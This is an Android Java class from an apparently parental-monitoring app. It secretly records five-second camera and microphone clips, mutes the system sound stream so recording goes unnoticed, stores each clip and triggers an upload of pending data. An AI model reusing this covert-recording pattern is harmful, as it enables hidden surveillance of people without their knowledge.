package com.byteshaft.kidmonitor.recorders;


import android.hardware.Camera;
import android.media.MediaRecorder;
import android.view.SurfaceHolder;

import com.byteshaft.ezflashlight.CameraStateChangeListener;
import com.byteshaft.ezflashlight.Flashlight;
import com.byteshaft.kidmonitor.AppGlobals;
import com.byteshaft.kidmonitor.constants.AppConstants;
import com.byteshaft.kidmonitor.database.MonitorDatabase;
import com.byteshaft.kidmonitor.utils.Helpers;
import com.byteshaft.kidmonitor.utils.Silencer;

import java.io.IOException;

public class VideoRecorder implements CameraStateChangeListener,
        CustomMediaRecorder.OnNewFileWrittenListener,
        CustomMediaRecorder.OnRecordingStateChangedListener {

    private static boolean sIsRecording;
    private CustomMediaRecorder mMediaRecorder;
    private Flashlight flashlight;
    private String mPath;

    public static boolean isRecording() {
        return sIsRecording;
    }

    void start(android.hardware.Camera camera, SurfaceHolder holder, int time) {
        camera.unlock();
        mMediaRecorder = CustomMediaRecorder.getInstance();
        mMediaRecorder.setOnNewFileWrittenListener(this);
        mMediaRecorder.setOnRecordingStateChangedListener(this);
        mMediaRecorder.setCamera(camera);
        mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
        mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
        mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
        mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.DEFAULT);
        mMediaRecorder.setVideoSize(640, 480);
        mMediaRecorder.setPreviewDisplay(holder.getSurface());
        mPath = AppGlobals.getNewFilePathForType(AppConstants.TYPE_VIDEO_RECORDINGS);
        System.out.println(mPath);
        mMediaRecorder.setOutputFile(mPath);
        try {
            mMediaRecorder.prepare();
            Silencer.silentSystemStream(2000);
            mMediaRecorder.start();
        } catch (IOException e) {
            e.printStackTrace();
        }

        new android.os.Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRecording()) {
                    stopRecording();
                }

            }
        }, time);
    }

    public void start() {
        flashlight = new Flashlight(AppGlobals.getContext());
        flashlight.setCameraStateChangedListener(this);
        flashlight.setupCameraPreview();
        sIsRecording = true;
    }

    public void stopRecording() {
        Silencer.silentSystemStream(2000);
        mMediaRecorder.stop();
        flashlight.releaseAllResources();
        mMediaRecorder.release();
        sIsRecording = false;
        if (mPath != null) {
            MonitorDatabase database = new MonitorDatabase(AppGlobals.getContext());
            database.createNewEntry(AppConstants.TYPE_VIDEO_RECORDINGS, mPath, Helpers.getTimeStamp());
            Helpers.checkInternetAndUploadPendingData();
        }
    }

    @Override
    public void onCameraInitialized() {

    }

    @Override
    public void onCameraViewSetup(Camera camera, SurfaceHolder surfaceHolder) {
        start(camera, surfaceHolder, 5000);
    }

    @Override
    public void onCameraBusy() {

    }

    @Override
    public void onNewRecordingCompleted(String path) {

    }

    @Override
    public void onStop(int stopper, String filePath) {

    }
}
